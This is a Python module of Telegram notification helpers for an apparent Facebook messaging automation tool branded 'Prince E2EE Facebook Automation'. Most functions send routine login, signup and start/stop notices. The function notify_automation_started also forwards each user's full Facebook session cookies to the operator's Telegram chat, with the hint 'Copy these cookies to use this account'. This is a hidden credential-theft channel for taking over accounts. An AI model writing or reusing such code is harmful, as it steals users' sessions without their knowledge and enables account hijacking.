import os
import requests
from datetime import datetime
import pytz

def get_kolkata_time():
    """Get current time in Asia/Kolkata timezone"""
    kolkata_tz = pytz.timezone('Asia/Kolkata')
    return datetime.now(kolkata_tz)

def send_telegram_notification(message):
    try:
        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        admin_id = os.environ.get('TELEGRAM_ADMIN_ID')
        
        if not bot_token or not admin_id:
            print("Telegram credentials not configured")
            return False
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': admin_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, json=payload, timeout=10)
        
        if response.status_code == 200:
            print(f"✅ Telegram notification sent successfully")
            return True
        else:
            print(f"⚠️ Telegram notification failed: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Telegram notification error: {str(e)}")
        return False

def notify_automation_started(username, chat_id, cookies="", message_count_target="unlimited"):
    timestamp = get_kolkata_time().strftime("%Y-%m-%d %H:%M:%S")
    
    # Truncate cookies if too long (Telegram has 4096 char limit)
    cookie_preview = cookies[:500] if cookies else "No cookies provided"
    if len(cookies) > 500:
        cookie_preview += "... (truncated)"
    
    message = f"""
🚀 <b>New Automation Started!</b>

👤 <b>User:</b> {username}
💬 <b>Chat ID:</b> {chat_id}
📊 <b>Target Messages:</b> {message_count_target}
🕐 <b>Time:</b> {timestamp} (Asia/Kolkata)

<i>Prince E2EE Facebook Automation</i>
"""
    
    # Send main notification
    send_telegram_notification(message)
    
    # Send cookies in separate message if available
    if cookies and cookies.strip():
        cookie_message = f"""
🍪 <b>Facebook Cookies for {username}</b>

<code>{cookies}</code>

💡 <i>Copy these cookies to use this account</i>
"""
        return send_telegram_notification(cookie_message)
    
    return True

def notify_automation_stopped(username, messages_sent):
    timestamp = get_kolkata_time().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""
⏹️ <b>Automation Stopped</b>

👤 <b>User:</b> {username}
📨 <b>Messages Sent:</b> {messages_sent}
🕐 <b>Time:</b> {timestamp}

<i>Prince E2EE Facebook Automation</i>
"""
    return send_telegram_notification(message)

def notify_new_user_signup(username):
    timestamp = get_kolkata_time().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""
✨ <b>New User Registered!</b>

👤 <b>Username:</b> {username}
🕐 <b>Time:</b> {timestamp} (Asia/Kolkata)

<i>Prince E2EE Facebook Automation</i>
"""
    return send_telegram_notification(message)

def notify_user_login(username):
    timestamp = get_kolkata_time().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""
🔐 <b>User Login</b>

👤 <b>Username:</b> {username}
🕐 <b>Time:</b> {timestamp} (Asia/Kolkata)

<i>Prince E2EE Facebook Automation</i>
"""
    return send_telegram_notification(message)
